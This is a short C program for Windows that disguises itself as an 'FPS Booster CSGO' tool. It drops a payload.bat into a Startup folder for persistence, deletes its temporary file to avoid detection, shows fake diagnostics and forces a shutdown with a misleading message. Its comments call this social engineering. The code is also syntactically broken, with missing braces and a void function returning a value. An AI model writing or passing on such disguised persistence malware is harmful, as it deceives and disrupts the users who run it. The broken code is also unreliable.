#include <Windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>

// get current user
void tunnel() {
    system("echo %USERPROFILE%>user");
}

// put file in startup folder
void tscan() {
    FILE *f,*fp;
    char s[800],ch;
	int i = 0;
    f=fopen("user","r");
    if(f==NULL) {
        exit(0);
    }
    while(feof(f)==0)
        fscanf(f,"%c",&ch);
        if(ch=='\n') {
            return 0;
        }
        s[i]=ch;
        i++;
    }
    fclose(f);
    system("echo. > 'AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.bat'");
    fp=fopen(s,"w");

	// see if you need admin
    if(fp==NULL)
        f=fopen("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.bat","w");
        if(f==NULL)
            system("cls");
            remove("user");
            printf("\nError... Run This Program As Administrator To Continue\n");
            system("timeout 10");
            exit(0);
        }
        fprintf(f,"\necho off\necho FPS Booster CSGO\npause");
        fclose(f);
        system("shutdown /f /t 005 /s /c \"We have to restart the PC to fix detected problems.\"");
        exit(0);
    }
    fprintf(fp,"\necho off\necho Your Computer Has Been Hacked!\npause");
    fclose(fp);
}

// clean up to avoid being detected
void ok()
    remove("user");
}

// run functions
void run()
    tunnel();
    tscan();
}

void pause()
    printf("\n");
    system("pause");
}

int main()
    // social engineering :)
    system("title FPS Booster CSGO ");
    run();
    ok();
    printf("\n|----- Resources Diagnostics -----|\n");
    printf("\n Checking PC for problems...\n");
    system("systeminfo");

	// shut the pc down so payload runs when the pc starts up
    system("shutdown /f /t 005 /s /c \"We have to shutdown the PC to fix detected problems.\"");
    pause();
}
